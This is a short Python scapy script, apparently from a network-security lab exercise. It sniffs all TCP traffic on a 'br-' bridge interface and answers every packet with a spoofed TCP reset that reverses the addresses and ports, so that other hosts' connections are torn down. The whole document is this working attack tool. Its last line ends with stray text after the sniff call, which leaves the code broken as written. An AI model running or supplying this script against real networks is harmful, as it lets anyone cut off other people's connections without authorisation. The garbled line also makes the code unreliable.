#!/usr/bin/env python3
from scapy.all import *
from search_iface_by_prefx import *
  
interface = search_iface_by_prefx("br-", get_if_list())
print (f'the interface is {interface}')
mac_address = get_if_hwaddr(interface)
print(f'This machine mac address is: {mac_address}')

def handle_sniffing(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,
            flags="R", seq=(pkt[TCP].seq + len(pkt[TCP].payload)))
    rst_pkt = ip/tcp
    send(rst_pkt,verbose=0)
    print(f'rst packet sent')
    rst_pkt.show()

pkt = sniff(iface=interface, filter='tcp', prn=handle_sniffing) cd\r



